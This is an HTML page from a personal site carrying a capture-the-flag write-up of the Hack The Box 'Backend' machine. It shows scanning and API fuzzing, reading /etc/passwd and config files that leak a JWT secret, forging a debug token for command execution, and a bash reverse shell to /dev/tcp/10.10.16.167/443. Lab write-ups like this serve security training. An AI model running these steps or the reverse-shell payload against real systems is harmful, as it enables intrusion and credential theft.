@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB Backend Writeup | Diego Chávez</title>
+    <link rel="stylesheet" href="../../styles/global.css" />
+    <link rel="stylesheet" href="../../styles/button.css" />
+    <link rel="stylesheet" href="../../styles/about.css" />
+    <link
+      rel="icon"
+      type="image/png"
+      href="https://api.iconify.design/simple-icons:hackthebox.svg?color=%23ff0000"
+    />
+    <style>
+      .writeup-img {
+        width: 100%;
+        max-width: 800px;
+        height: auto;
+        border-radius: 8px;
+        border: 1px solid rgba(89, 249, 255, 0.2);
+        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+        margin: 12px 0;
+        display: block;
+      }
+    </style>
+  </head>
+  <body>
+    <main class="content-wrapper" style="max-width: 900px; margin: 0 auto; padding: 40px 20px;">
+      
+      <!-- ENCABEZADO Y ETIQUETAS -->
+      <section class="hero" style="text-align: left; margin-bottom: 40px;">
+        <h1 style="color: var(--link-hover-color); font-size: 2.3rem; margin-bottom: 10px;">HTB: Backend</h1>
+        
+        <div class="tags" style="margin: 15px 0; display: flex; gap: 8px; flex-wrap: wrap;">
+          <span style="background: rgba(255,165,0,0.2); color: #ffa500; padding: 4px 10px; border-radius: 5px; font-size: 0.85rem; font-weight: bold;">#Medium</span>
+          <span style="background: rgba(89,249,255,0.1); color: #59f9ff; padding: 4px 10px; border-radius: 5px; font-size: 0.85rem;">#linux</span>
+          <span style="background: rgba(89,249,255,0.1); color: #59f9ff; padding: 4px 10px; border-radius: 5px; font-size: 0.85rem;">#api</span>
+          <span style="background: rgba(89,249,255,0.1); color: #59f9ff; padding: 4px 10px; border-radius: 5px; font-size: 0.85rem;">#jwt</span>
+        </div>
+      </section>
+
+      <!-- CONTENIDO DEL WRITEUP -->
+      <article class="writeup-body" style="line-height: 1.8; color: #e2e8f0; display: flex; flex-direction: column; gap: 25px;">
+        
+        <div class="step-card" style="background: rgba(22, 2, 61, 0.4); padding: 25px; border-radius: 12px; border: 1px solid rgba(89, 249, 255, 0.15);">
+          
+          <p>First, we send an ICMP ping to check if the target machine is active.</p>
+          <img src="./images/Pasted image 20260405125822.png" alt="ICMP Ping Check" class="writeup-img" />
+          <p>The TTL value of 63 indicates that we are interacting with a Linux operating system (close to TTL 64).</p>
+
+          <p style="margin-top: 15px;">Now, let's scan for open ports using Nmap:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.227.148 -oG allPorts</code></pre>
+          <p style="margin-top: 10px;">We discover open ports 22 (SSH) and 80 (HTTP):</p>
+          <img src="./images/Pasted image 20260405130633.png" alt="Open Ports Scan Result" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Next, we launch service detection scripts on the discovered ports:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">nmap -p22,80 -sCV 10.129.227.148 -oN targeted</code></pre>
+          <p style="margin-top: 10px;">Output details:</p>
+          <img src="./images/Pasted image 20260405131109.png" alt="Service Detection Output" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Wappalyzer highlights Uvicorn and Python as web technologies running on the target application:</p>
+          <img src="./images/Pasted image 20260405131212.png" alt="Technology Stack Identification" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We run directory fuzzing using <code>ffuf</code>:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">ffuf -c -mc 200 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.129.227.148/FUZZ</code></pre>
+          <p style="margin-top: 10px;">We receive a 200 OK status code response for <code>api</code> and <code>docs</code> endpoints.</p>
+
+          <p style="margin-top: 10px;">Navigating to <code>http://10.129.227.148/api/v1</code> reveals the endpoints <code>/user</code> and <code>/admin</code>. Accessing <code>/user</code> returns <i>Not Found</i>, while <code>/admin</code> responds with <i>Not authenticated</i>.</p>
+
+          <p style="margin-top: 15px;">We enumerate the user endpoint further:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">ffuf -c -fc 404 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.129.227.148/api/v1/user/FUZZ</code></pre>
+          <p style="margin-top: 10px;">Fuzzing numerical IDs yields status 200 responses, with identifiers <code>01</code> and <code>1</code> returning a specific response length of 141 characters:</p>
+          <img src="./images/Pasted image 20260405132855.png" alt="User ID Enumeration Result" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We save the response content locally:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">curl -s -X GET "http://10.129.227.148/api/v1/user/1" | jq | tee user_admin</code></pre>
+
+          <p style="margin-top: 15px;">Checking for other HTTP methods using POST fuzzing:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">ffuf -c -mc 422 -X POST -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.129.227.148/api/v1/user/FUZZ</code></pre>
+          <p style="margin-top: 10px;">This discloses <code>login</code> and <code>signup</code> routes returning HTTP status 422 (Unprocessable Entity).</p>
+
+          <p style="margin-top: 15px;">Inspecting endpoint requirements:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">curl -s -X GET "http://10.129.227.148/api/v1/user/login" | jq | tee login_r
+curl -s -X GET "http://10.129.227.148/api/v1/user/signup" | jq | tee signup_r</code></pre>
+
+          <p style="margin-top: 15px;">Sending form data returns a validation error requiring JSON format. We register a new user account by transmitting JSON data:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">curl -s -X POST http://10.129.227.148/api/v1/user/signup -H "Content-Type: application/json" -d '{"email":"d1o@d1o.com", "password":"test123"}' | jq</code></pre>
+          <p style="margin-top: 10px;">The server responds with <code>{}</code>, confirming successful user creation.</p>
+
+          <p style="margin-top: 15px;">Next, we authenticate via the login endpoint:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">curl -s -X POST http://10.129.227.148/api/v1/user/login -d 'username=d1o@d1o.com&password=test123' | jq</code></pre>
+          <p style="margin-top: 10px;">We obtain a JSON Web Token (JWT) access token.</p>
+
+          <p style="margin-top: 15px;">Analyzing the JWT payload structure on jwt.io:</p>
+          <img src="./images/Pasted image 20260405141629.png" alt="JWT Token Analysis" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We test our Bearer token against the documentation route (<code>/docs</code>):</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">curl -s -X POST http://10.129.227.148/docs/ -H "Authorization: Bearer &lt;JWT_TOKEN&gt;" -I -L</code></pre>
+
+          <p style="margin-top: 15px;">Using Caido / Burp Suite, we configure Match & Replace rules to automatically inject our Authorization header:</p>
+          <img src="./images/Pasted image 20260405142843.png" alt="Match & Replace Configuration" class="writeup-img" />
+          <img src="./images/Pasted image 20260405142939.png" alt="Proxy Intercept Enabled" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Rendering the response reveals the interactive FastAPI documentation interface:</p>
+          <img src="./images/Pasted image 20260405145215.png" alt="FastAPI Interactive Documentation" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Here we review all exposed API endpoints and retrieve the user flag (<code>user.txt</code>):</p>
+          <img src="./images/Pasted image 20260405145450.png" alt="Exposed API Endpoints & User Flag" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Using the previously extracted GUID for user 1/01, we trigger a password reset for the account:</p>
+          <img src="./images/Pasted image 20260405150816.png" alt="GUID Password Reset Request" class="writeup-img" />
+          <p style="margin-top: 10px;">HTTP status codes confirm successful password alteration:</p>
+          <img src="./images/Pasted image 20260405150931.png" alt="Password Change Confirmation" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Re-authenticating via the interactive API authorization dialog unlocks the <code>/api/v1/admin/</code> endpoints:</p>
+          <img src="./images/Pasted image 20260405151159.png" alt="Admin Endpoint Authorization" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We test arbitrary file reading capabilities via <code>/api/v1/admin/file</code> by requesting <code>/etc/passwd</code>:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">{
+  "file": "/etc/passwd"
+}</code></pre>
+          
+          <p style="margin-top: 15px;">Inspecting our updated admin JWT token structure:</p>
+          <img src="./images/Pasted image 20260405151902.png" alt="Admin JWT Analysis" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Identifying users with active bash shells from <code>/etc/passwd</code>:</p>
+          <img src="./images/Pasted image 20260405152252.png" alt="Active Bash Shell Users" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Alternative method to extract user flag information:</p>
+          <img src="./images/Pasted image 20260405152459.png" alt="Alternative Flag Extraction" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We read process environment variables to uncover application paths and configuration context:</p>
+          <img src="./images/Pasted image 20260405152926.png" alt="Environment Variables Reading" class="writeup-img" />
+
+          <p style="margin-top: 15px;">The exposed path points to <code>/home/htb/uhc/app/main.py</code>. We download source files locally:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">curl -X 'POST' \
+  'http://10.129.227.148/api/v1/admin/file' \
+  -H 'accept: application/json' \
+  -H 'Authorization: Bearer &lt;ADMIN_JWT&gt;' \
+  -H 'Content-Type: application/json' \
+  -d '{ "file": "/home/htb/uhc/app/main.py" }' | jq > main.py</code></pre>
+
+          <p style="margin-top: 15px;">Inspecting <code>main.py</code> reveals an internal module import from <code>app.core.config</code>. We retrieve <code>config.py</code>:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">curl -X 'POST' 'http://10.129.227.148/api/v1/admin/file' -H 'Authorization: Bearer &lt;ADMIN_JWT&gt;' -H 'Content-Type: application/json' -d '{ "file": "/home/htb/uhc/app/core/config.py" }' | jq > config.py</code></pre>
+          <p style="margin-top: 10px;">Inside <code>config.py</code>, we find the JWT secret key and superuser credentials (<code>SuperSecretSigningKey-HTB</code>, <code>root@ippsec.rocks</code>):</p>
+          <img src="./images/Pasted image 20260405154334.png" alt="JWT Secret Discovery" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Using the discovered secret key, we craft a forged JWT token enabling debug capabilities (<code>"debug": true</code>):</p>
+          <img src="./images/Pasted image 20260405154701.png" alt="Forged Debug JWT Token" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We test remote code execution via the admin execution route:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">curl -s -X GET http://10.129.227.148/api/v1/admin/exec/whoami -H "Authorization: Bearer &lt;FORGED_JWT&gt;" | jq</code></pre>
+
+          <p style="margin-top: 15px;">To establish a reverse shell, we URL-encode a Base64-decoded reverse shell payload:</p>
+          <pre style="background: #07030F; padding: 12px; border-radius: 6px; overflow-x: auto; margin-top: 8px; border: 1px solid #333;"><code style="color: #66ff52;">bash -i >& /dev/tcp/10.10.16.167/443 0>&1</code></pre>
+          <img src="./images/Pasted image 20260405172626.png" alt="Encoded Reverse Shell Payload Request" class="writeup-img" />
+
+          <p style="margin-top: 15px;">We catch the incoming interactive reverse connection on our netcat listener:</p>
+          <img src="./images/Pasted image 20260405172733.png" alt="Netcat Listener Shell Catch" class="writeup-img" />
+
+          <p style="margin-top: 15px;">System interaction and privilege verification:</p>
+          <img src="./images/Pasted image 20260405181037.png" alt="Interactive Shell Access" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Reading the root flag (<code>root.txt</code>):</p>
+          <img src="./images/Pasted image 20260405181112.png" alt="Root Flag Retrieval" class="writeup-img" />
+
+          <p style="margin-top: 15px;">Challenge completed successfully:</p>
+          <img src="./images/Pasted image 20260405181156.png" alt="Challenge Complete Confirmation" class="writeup-img" />
+
+        </div>
+
+      </article>
+
+      <!-- BOTONES DE NAVEGACIÓN -->
+      <div class="button-container" style="margin-top: 40px; display: flex; justify-content: center; gap: 15px;">
+        <a href="writeups.html" class="button-33" role="button">Back to Writeups</a>
+        <a href="../../" class="button-33" role="button">Back home</a>
+      </div>
+
+    </main>
+  </body>
+</html>
